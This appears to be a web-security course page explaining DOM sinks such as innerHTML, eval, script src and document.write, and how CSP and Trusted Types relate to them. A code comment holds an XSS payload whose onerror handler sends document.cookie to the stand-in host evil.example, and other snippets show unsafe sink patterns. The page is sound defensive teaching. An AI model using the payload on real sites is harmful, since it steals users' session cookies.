PrerequisitesDOM Sinks

A sink is any browser API that takes a string (or a string-shaped value) and turns it into live markup or running code. Sinks are the reason XSS is possible at all — an attacker doesn't need to exploit a browser bug, they just need to get their string into a sink your page already calls.

Why "sink" and not just "function"

Think of your page's data flow as plumbing. Untrusted input (a URL parameter, a form field, a value from an API) is water. Most of your code just passes that water through pipes — string concatenation, storing it in a variable, displaying it as escaped text. A sink is a drain: the point where the water leaves the pipe system and does something in the real world. If untrusted water reaches a sink unfiltered, whatever the sink does, it does with attacker-controlled content.

The HTML sink: innerHTML

// If `comment` came from a URL param or user input, this is a sink:
document.getElementById('output').innerHTML = comment;

// An attacker-supplied comment like this now RUNS as script:
// <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">

innerHTML doesn't just display a string — it parses it as HTML and inserts real DOM nodes, including elements whose event-handler attributes execute JS. outerHTML, insertAdjacentHTML, and document.write are the same category of sink.

The code sink: eval and friends

eval(userInput);                    // runs userInput as JS, full stop
new Function(userInput)();          // same category
setTimeout(userInput, 100);         // string form of setTimeout also evals
element.setAttribute('onclick', userInput); // injects an executable attribute

The script-loading sink: <script src>

const s = document.createElement('script');
s.src = userSuppliedUrl;   // if attacker controls this URL, they control what runs
document.head.appendChild(s);

document.write

Worth calling out on its own: document.write(str) parses str as HTML directly into the document's parse stream — same danger class as innerHTML, but even less controllable because it can only be called while the document is still parsing.

Where this is going CSP's script-src directive (Track 1) restricts where code is allowed to come from — and, verified directly in Track 2 Module 14, a strict script-src genuinely does block an onerror handler even when it arrives via innerHTML = attackerString at runtime, not just ones written directly in the original HTML — don't assume otherwise. What CSP has no jurisdiction over at all is the innerHTML assignment itself: a string containing zero executable content (real HTML structure, a real link to an attacker's page — no script, no handler) sails through completely unchecked, because there's nothing in it for script-src to evaluate. Trusted Types (Track 2) exists to close that gap — the sink accepting a raw string at all, regardless of whether anything inside it would ever try to execute.
